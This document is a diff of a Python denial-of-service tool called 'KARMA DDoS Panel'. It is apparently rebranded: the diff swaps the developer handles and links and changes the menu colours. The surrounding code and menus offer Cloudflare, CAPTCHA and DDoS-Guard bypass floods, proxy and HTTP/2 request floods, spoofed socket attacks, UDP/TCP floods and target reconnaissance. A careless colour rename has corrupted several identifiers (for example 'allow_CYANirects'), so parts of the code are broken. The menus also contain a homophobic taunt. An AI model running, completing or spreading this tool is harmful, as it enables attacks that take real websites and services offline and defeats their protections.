@@ -1,6 +1,5 @@
-# -*- coding: utf-8 -*-
-# Developer - @opsec
-# Contact me here - Telegram - https://t.me/opsector
+# Developer - @solve
+# Contact me here - Telegram - https://t.me/internalvpn
 from os import system, name
 import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
 from urllib.parse import urlparse
@@ -8,16 +7,18 @@ from requests.cookies import RequestsCookieJar
 import undetected_chromedriver as webdriver
 from sys import stdout
 from colorama import Fore, init
+from colorama import Fore, Style
+from sys import stdout
 
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     while True:
         if (until - datetime.datetime.now()).total_seconds() > 0:
             stdout.flush()
-            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
+            stdout.write("\r "+Fore.CYAN+"[*]"+Fore.RED+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
         else:
             stdout.flush()
-            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
+            stdout.write("\r "+Fore.CYAN+"[*]"+Fore.RED+" Attack Done !                                   \n")
             return
 
 
@@ -53,7 +54,7 @@ def get_proxylist(type):
 def get_proxies():
     global proxies
     if not os.path.exists("./proxy.txt"):
-        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
+        stdout.write(Fore.CYAN+" [*]"+Fore.RED+" You Need Proxy File ( ./proxy.txt )\n")
         return False
     proxies = open("./proxy.txt", 'r').read().split('\n')
     return True
@@ -107,22 +108,22 @@ def spoof(target):
 
 ##############################################################################################
 def get_info_l7():
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.MAGENTA+": "+Fore.LIGHTMAGENTA_EX)
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"URL      "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
     target = input()
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.MAGENTA+": "+Fore.LIGHTMAGENTA_EX)
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"THREAD   "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
     thread = input()
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.MAGENTA+": "+Fore.LIGHTMAGENTA_EX)
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"TIME(s)  "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
     t = input()
     return target, thread, t
 
 def get_info_l4():
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.MAGENTA+": "+Fore.LIGHTMAGENTA_EX)
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"IP       "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
     target = input()
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.MAGENTA+": "+Fore.LIGHTMAGENTA_EX)
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"PORT     "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
     port = input()
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.MAGENTA+": "+Fore.LIGHTMAGENTA_EX)
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"THREAD   "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
     thread = input()
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.MAGENTA+": "+Fore.LIGHTMAGENTA_EX)
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"TIME(s)  "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
     t = input()
     return target, port, thread, t
 ##############################################################################################
@@ -560,8 +561,8 @@ def AttackCFPRO(url, until_datetime, scraper):
     }
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            scraper.get(url=url, headers=headers, allow_MAGENTAirects=False)
-            scraper.get(url=url, headers=headers, allow_MAGENTAirects=False)
+            scraper.get(url=url, headers=headers, allow_CYANirects=False)
+            scraper.get(url=url, headers=headers, allow_CYANirects=False)
         except:
             pass
 #endregion
@@ -799,112 +800,111 @@ def clear():
 def help():
     clear()
     stdout.write("                                                                                         \n")
-    stdout.write("                                 "+Fore.CYAN   +"  ╦ ╦╔═╗╦  ╔═╗             \n")
-    stdout.write("                                 "+Fore.MAGENTA    +"  ╠═╣║╣ ║  ╠═╝             \n")
-    stdout.write("                                 "+Fore.MAGENTA    +"  ╩ ╩╚═╝╩═╝╩                \n")
-    stdout.write("             "+Fore.MAGENTA            +"        ══╦═════════════════════════════════╦══\n")
-    stdout.write("             "+Fore.MAGENTA            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"layer7   "+Fore.MAGENTA+"|"+Fore.CYAN+" Show Layer7 Methods                    "+Fore.MAGENTA+"║\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"layer4   "+Fore.MAGENTA+"|"+Fore.CYAN+" Show Layer4 Methods                    "+Fore.MAGENTA+"║\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"tools    "+Fore.MAGENTA+"|"+Fore.CYAN+" Show tools                             "+Fore.MAGENTA+"║\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"credits  "+Fore.MAGENTA+"|"+Fore.CYAN+" Show credits                           "+Fore.MAGENTA+"║\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"exit     "+Fore.MAGENTA+"|"+Fore.CYAN+" Exit KARMA DDoS Panel                  "+Fore.MAGENTA+"║\n")
-    stdout.write("             "+Fore.MAGENTA            +"╠═════════════════════════════════════════════════════╣\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"Socials  "+Fore.MAGENTA+"|"+Fore.CYAN+" https://glock.rip/obey                "+Fore.MAGENTA+"║\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"github   "+Fore.MAGENTA+"|"+Fore.CYAN+" https://github.com/antifed   "+Fore.MAGENTA+"║\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"Read     "+Fore.MAGENTA+"|"+Fore.CYAN+" Star this project or u gay ;)          "+Fore.MAGENTA+"║\n")
-    stdout.write("             "+Fore.MAGENTA            +"╚═════════════════════════════════════════════════════╝\n")
+    stdout.write("                                 "+Fore.RED   +"  ╦ ╦╔═╗╦  ╔═╗             \n")
+    stdout.write("                                 "+Fore.CYAN    +"  ╠═╣║╣ ║  ╠═╝             \n")
+    stdout.write("                                 "+Fore.RED    +"  ╩ ╩╚═╝╩═╝╩                \n")
+    stdout.write("             "+Fore.CYAN            +"╔═════════════════════════════════════════════════════╗\n")
+    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"layer7   "+Fore.CYAN+"|"+Fore.RED+" Show Layer7 Methods                    "+Fore.CYAN+"║\n")
+    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"layer4   "+Fore.CYAN+"|"+Fore.RED+" Show Layer4 Methods                    "+Fore.CYAN+"║\n")
+    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"tools    "+Fore.CYAN+"|"+Fore.RED+" Show tools                             "+Fore.CYAN+"║\n")
+    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"exit     "+Fore.CYAN+"|"+Fore.RED+" Exit KARMA DDoS Panel                  "+Fore.CYAN+"║\n")
+    stdout.write("             "+Fore.CYAN            +"╠═════════════════════════════════════════════════════╣\n")
+    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"Socials  "+Fore.CYAN+"|"+Fore.RED+" https://glock.rip/solve               "+Fore.CYAN+"║\n")
+    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"GitHub   "+Fore.CYAN+"|"+Fore.RED+" https://github.com/internalvpn        "+Fore.CYAN+"║\n")
+    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"Read     "+Fore.CYAN+"|"+Fore.RED+" Star this project or u gay ;)          "+Fore.CYAN+"║\n")
+    stdout.write("             "+Fore.CYAN            +"╚═════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 
-def cMAGENTAit():
+def cCYANit():
     stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.CYAN   +"Developer "+Fore.MAGENTA+": \x1b[38;2;0;255;189m@federal\n")
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.CYAN   +" "+Fore.MAGENTA+": \x1b[38;2;0;255;189m\n")
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.CYAN   +" "+Fore.MAGENTA+": \x1b[38;2;0;255;189m\n")
+    stdout.write("\x1b[38;2;255;20;147m• "+Fore.RED   +"Developer "+Fore.CYAN+": \x1b[38;2;0;255;189m@solve\n")
+    stdout.write("\x1b[38;2;255;20;147m• "+Fore.RED   +" "+Fore.CYAN+": \x1b[38;2;0;255;189m\n")
+    stdout.write("\x1b[38;2;255;20;147m• "+Fore.RED   +" "+Fore.CYAN+": \x1b[38;2;0;255;189m\n")
     stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
     stdout.write("\n")    
 
 def layer7():
     clear()
     stdout.write("                                                                                         \n")
-    stdout.write("                                 "+Fore.CYAN   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗             \n")
-    stdout.write("                                 "+Fore.MAGENTA    +"║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝             \n")
-    stdout.write("                                 "+Fore.MAGENTA    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩              \n")
-    stdout.write("             "+Fore.MAGENTA            +"        ══╦═════════════════════════════════╦══\n")
-    stdout.write("            "+Fore.MAGENTA            +"╔══════════╩═════════════════════════════════╩═════════╗\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"cfb    "+Fore.MAGENTA+" |"+Fore.CYAN+" Bypass CF Attack                         "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"pxcfb  "+Fore.MAGENTA+" |"+Fore.CYAN+" Bypass CF Attack With Proxy              "+Fore.MAGENTA+"║\n")                  
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"cfreq  "+Fore.MAGENTA+" |"+Fore.CYAN+" Bypass CF UAM, CAPTCHA, BFM (request)    "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"cfsoc  "+Fore.MAGENTA+" |"+Fore.CYAN+" Bypass CF UAM, CAPTCHA, BFM (socket)     "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"pxsky  "+Fore.MAGENTA+" |"+Fore.CYAN+" Bypass Google Project Shield, Vshield,   "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m  "+Fore.CYAN+"       "+Fore.MAGENTA+" |"+Fore.CYAN+" DDoS Guard Free, CF NoSec With Proxy     "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"sky    "+Fore.MAGENTA+" |"+Fore.CYAN+" Sky method without proxy                 "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"http2  "+Fore.MAGENTA+" |"+Fore.CYAN+" HTTP 2.0 Request Attack                  "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"pxhttp2"+Fore.MAGENTA+" |"+Fore.CYAN+" HTTP 2.0 Request Attack With Proxy       "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"get    "+Fore.MAGENTA+" |"+Fore.CYAN+" Get Request Attack                       "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"post   "+Fore.MAGENTA+" |"+Fore.CYAN+" Post Request Attack                      "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"head   "+Fore.MAGENTA+" |"+Fore.CYAN+" Head Request Attack                      "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"pps    "+Fore.MAGENTA+" |"+Fore.CYAN+" Only GET / HTTP/1.1                      "+Fore.MAGENTA+"║\n")
+    stdout.write("                               "+Fore.RED   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗             \n")
+    stdout.write("                               "+Fore.CYAN    +"║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝             \n")
+    stdout.write("                               "+Fore.RED    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩              \n")
+
+    stdout.write("            "+Fore.CYAN            +"╔══════════════════════════════════════════════════════╗\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"cfb    "+Fore.CYAN+" |"+Fore.RED+" Bypass CF Attack                         "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pxcfb  "+Fore.CYAN+" |"+Fore.RED+" Bypass CF Attack With Proxy              "+Fore.CYAN+"║\n")                  
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"cfreq  "+Fore.CYAN+" |"+Fore.RED+" Bypass CF UAM, CAPTCHA, BFM (request)    "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"cfsoc  "+Fore.CYAN+" |"+Fore.RED+" Bypass CF UAM, CAPTCHA, BFM (socket)     "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pxsky  "+Fore.CYAN+" |"+Fore.RED+" Bypass Google Project Shield, Vshield,   "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"sky    "+Fore.CYAN+" |"+Fore.RED+" Sky method without proxy                 "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"http2  "+Fore.CYAN+" |"+Fore.RED+" HTTP 2.0 Request Attack                  "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pxhttp2"+Fore.CYAN+" |"+Fore.RED+" HTTP 2.0 Request Attack With Proxy       "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"get    "+Fore.CYAN+" |"+Fore.RED+" Get Request Attack                       "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"post   "+Fore.CYAN+" |"+Fore.RED+" Post Request Attack                      "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"head   "+Fore.CYAN+" |"+Fore.RED+" Head Request Attack                      "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pps    "+Fore.CYAN+" |"+Fore.RED+" Only GET / HTTP/1.1                      "+Fore.CYAN+"║\n")
     
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"spoof  "+Fore.MAGENTA+" |"+Fore.CYAN+" HTTP Spoof Socket Attack                 "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"pxspoof"+Fore.MAGENTA+" |"+Fore.CYAN+" HTTP Spoof Socket Attack With Proxy      "+Fore.MAGENTA+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"spoof  "+Fore.CYAN+" |"+Fore.RED+" HTTP Spoof Socket Attack                 "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pxspoof"+Fore.CYAN+" |"+Fore.RED+" HTTP Spoof Socket Attack With Proxy      "+Fore.CYAN+"║\n")
     
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"soc    "+Fore.MAGENTA+" |"+Fore.CYAN+" Socket Attack                            "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"pxraw  "+Fore.MAGENTA+" |"+Fore.CYAN+" Proxy Request Attack                     "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"pxsoc  "+Fore.MAGENTA+" |"+Fore.CYAN+" Proxy Socket Attack                      "+Fore.MAGENTA+"║\n")
-    stdout.write("            "+Fore.MAGENTA            +"╚══════════════════════════════════════════════════════╝\n") 
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"soc    "+Fore.CYAN+" |"+Fore.RED+" Socket Attack                            "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pxraw  "+Fore.CYAN+" |"+Fore.RED+" Proxy Request Attack                     "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pxsoc  "+Fore.CYAN+" |"+Fore.RED+" Proxy Socket Attack                      "+Fore.CYAN+"║\n")
+    stdout.write("            "+Fore.CYAN            +"╚══════════════════════════════════════════════════════╝\n") 
     stdout.write("\n")
 
 def layer4():
     clear()
     stdout.write("                                                                                         \n")
-    stdout.write("                                 "+Fore.CYAN   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
-    stdout.write("                                 "+Fore.MAGENTA    +"║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
-    stdout.write("                                 "+Fore.MAGENTA    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
-    stdout.write("             "+Fore.MAGENTA            +"        ══╦═════════════════════════════════╦══\n")
-    stdout.write("             "+Fore.MAGENTA            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"udp   "+Fore.MAGENTA+"|"+Fore.CYAN+" UDP Attack                                "+Fore.MAGENTA+"║\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"tcp   "+Fore.MAGENTA+"|"+Fore.CYAN+" TCP Attack                                "+Fore.MAGENTA+"║\n")
-    stdout.write("             "+Fore.MAGENTA            +"╚═════════════════════════════════════════════════════╝\n") 
+    stdout.write("                                 "+Fore.RED   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
+    stdout.write("                                 "+Fore.CYAN    +"║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
+    stdout.write("                                 "+Fore.RED    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
+    stdout.write("             "+Fore.CYAN            +"╔═════════════════════════════════════════════════════╗\n")
+    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"udp   "+Fore.CYAN+"|"+Fore.RED+" UDP Attack                                "+Fore.CYAN+"║\n")
+    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"tcp   "+Fore.CYAN+"|"+Fore.RED+" TCP Attack                                "+Fore.CYAN+"║\n")
+    stdout.write("             "+Fore.CYAN            +"╚═════════════════════════════════════════════════════╝\n") 
     stdout.write("\n")
 
 def tools():
     clear()
     stdout.write("                                                                                         \n")
-    stdout.write("                                 "+Fore.CYAN   +"╔╦╗╔═╗╔═╗╦  ╔═╗             \n")
-    stdout.write("                                 "+Fore.MAGENTA    +" ║ ║ ║║ ║║  ╚═╗             \n")
-    stdout.write("                                 "+Fore.MAGENTA    +" ╩ ╚═╝╚═╝╩═╝╚═╝             \n")
-    stdout.write("             "+Fore.MAGENTA            +"        ══╦═════════════════════════════════╦══\n")
-    stdout.write("             "+Fore.MAGENTA            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"geoip "+Fore.MAGENTA+"|"+Fore.CYAN+" Geo IP Address Lookup"+Fore.MAGENTA+"                     ║\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"dns   "+Fore.MAGENTA+"|"+Fore.CYAN+" Classic DNS Lookup   "+Fore.MAGENTA+"                     ║\n")
-    stdout.write("             "+Fore.MAGENTA            +"║ \x1b[38;2;255;20;147m• "+Fore.CYAN+"subnet"+Fore.MAGENTA+"|"+Fore.CYAN+" Subnet IP Address Lookup   "+Fore.MAGENTA+"               ║\n")
-    stdout.write("             "+Fore.MAGENTA            +"╚═════════════════════════════════════════════════════╝\n") 
+    stdout.write("                                 "+Fore.RED   +"╔╦╗╔═╗╔═╗╦  ╔═╗             \n")
+    stdout.write("                                 "+Fore.CYAN    +" ║ ║ ║║ ║║  ╚═╗             \n")
+    stdout.write("                                 "+Fore.RED    +" ╩ ╚═╝╚═╝╩═╝╚═╝             \n")
+    stdout.write("             "+Fore.CYAN            +"╔═════════════════════════════════════════════════════╗\n")
+    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"geoip "+Fore.CYAN+"|"+Fore.RED+" Geo IP Address Lookup"+Fore.CYAN+"                     ║\n")
+    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"dns   "+Fore.CYAN+"|"+Fore.RED+" Classic DNS Lookup   "+Fore.CYAN+"                     ║\n")
+    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"subnet"+Fore.CYAN+"|"+Fore.RED+" Subnet IP Address Lookup   "+Fore.CYAN+"               ║\n")
+    stdout.write("             "+Fore.CYAN            +"╚═════════════════════════════════════════════════════╝\n") 
     stdout.write("\n")
+
+def center_text(text, total_width):
+    spaces = (total_width - len(text)) // 2
+    return " " * spaces + text
 
 def title():
     stdout.write("                                                                                          \n")
-    stdout.write("                                 "+Fore.CYAN  +"╦╔═╔═╗╦═╗╔╦╗╔═╗                 \n")
-    stdout.write("                                 "+Fore.MAGENTA   +"╠╩╗╠═╣╠╦╝║║║╠═╣                 \n")
-    stdout.write("                                 "+Fore.MAGENTA   +"╩ ╩╩ ╩╩╚═╩ ╩╩ ╩                \n")
-    stdout.write("             "+Fore.MAGENTA            +"        ══╦═════════════════════════════════╦══\n")
-    stdout.write("             "+Fore.MAGENTA+"╔═════════╩═════════════════════════════════╩═════════╗\n")
-    stdout.write("             "+Fore.MAGENTA+"║ "+Fore.CYAN   +"         Welcome to Karma-DDoS Panel         "+Fore.MAGENTA  +"       ║\n")
-    stdout.write("             "+Fore.MAGENTA+"║ "+Fore.CYAN   +"          Type [ ? ] to see the commands     "+Fore.MAGENTA +"       ║\n")
-    stdout.write("             "+Fore.MAGENTA+"║ "+Fore.CYAN   +"         Contact - Telegram @nonefederal   "+Fore.MAGENTA +"            ║\n")
-    stdout.write("             "+Fore.MAGENTA+"╚═════════════════════════════════════════════════════╝\n") 
+    stdout.write("                                 "+Fore.RED  +"╦╔═╔═╗╦═╗╔╦╗╔═╗                 \n")
+    stdout.write("                                 "+Fore.CYAN   +"╠╩╗╠═╣╠╦╝║║║╠═╣                 \n")
+    stdout.write("                                 "+Fore.RED   +"╩ ╩╩ ╩╩╚═╩ ╩╩ ╩                \n")
+    stdout.write("             "+Fore.CYAN+"╔═════════════════════════════════════════════════════╗\n")
+    stdout.write("             "+Fore.CYAN+"║ "+Fore.RED   +"          Type [ ? ] to see the commands     "+Fore.CYAN +"       ║\n")
+    stdout.write("             "+Fore.CYAN+"║ "+Fore.RED   +"         Contact - Telegram @internalvpns   "+Fore.CYAN +"        ║\n")
+    stdout.write("             "+Fore.CYAN+"╚═════════════════════════════════════════════════════╝\n") 
     stdout.write("\n")
 
+title()
+
 def command():
-    stdout.write(Fore.MAGENTA+"╔═══"+Fore.MAGENTA+"[""root"+Fore.LIGHTMAGENTA_EX+"@"+Fore.MAGENTA+"Karma"+Fore.CYAN+"]"+Fore.MAGENTA+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
+    stdout.write(Fore.CYAN+"╔═══"+Fore.CYAN+"[""root"+Fore.LIGHTCYAN_EX+"@"+Fore.CYAN+"input"+Fore.RED+"]"+Fore.CYAN+"\n╚══\x1b[38;2;0;255;189m> "+Fore.RED)
     command = input()
     if command == "cls" or command == "clear":
         clear()
         title()
     elif command == "help" or command == "?":
         help()
-    elif command == "cMAGENTAits":
-        cMAGENTAit()        
+    elif command == "cCYANits":
+        cCYANit()        
     elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
         layer7()
     elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
@@ -1002,24 +1002,24 @@ def command():
             timer.join()
     elif command == "cfreq" or command == "CFREQ":
         target, thread, t = get_info_l7()
-        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Bypassing CF... (Max 60s)\n")
         if get_cookie(target):
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
             LaunchCFPRO(target, thread, t)
             timer.join()
         else:
-            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
+            stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Failed to bypass cf\n")
     elif command == "cfsoc" or command == "CFSOC":
         target, thread, t = get_info_l7()
-        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Bypassing CF... (Max 60s)\n")
         if get_cookie(target):
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
             LaunchCFSOC(target, thread, t)
             timer.join()
         else:
-            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
+            stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Failed to bypass cf\n")
     elif command == "pxsky" or command == "PXSKY":
         if get_proxies():
             target, thread, t = get_info_l7()
@@ -1049,63 +1049,63 @@ def command():
 
 ##############################################################################################     
     elif command == "subnet":
-        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.MAGENTA+": "+Fore.LIGHTMAGENTA_EX)
+        stdout.write(Fore.CYAN+" [>] "+Fore.RED+"IP "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
         target = input()
         try:
             r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
             print(r.text)
         except:
-            print('An error has occurMAGENTA while sending the request to the API!')                   
+            print('An error has occurCYAN while sending the request to the API!')                   
             
     elif command == "dns":
-        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.MAGENTA+": "+Fore.LIGHTMAGENTA_EX)
+        stdout.write(Fore.CYAN+" [>] "+Fore.RED+"IP/DOMAIN "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
         target = input()
         try:
             r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
             print(r.text)
         except:
-            print('An error has occurMAGENTA while sending the request to the API!')
+            print('An error has occurCYAN while sending the request to the API!')
             
     elif command == "geoip":
-        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.MAGENTA+": "+Fore.LIGHTMAGENTA_EX)
+        stdout.write(Fore.CYAN+" [>] "+Fore.RED+"IP "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
         target = input()
         try:
             r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
             print(r.text)
         except:
-            print('An error has occurMAGENTA while sending the request to the API!')
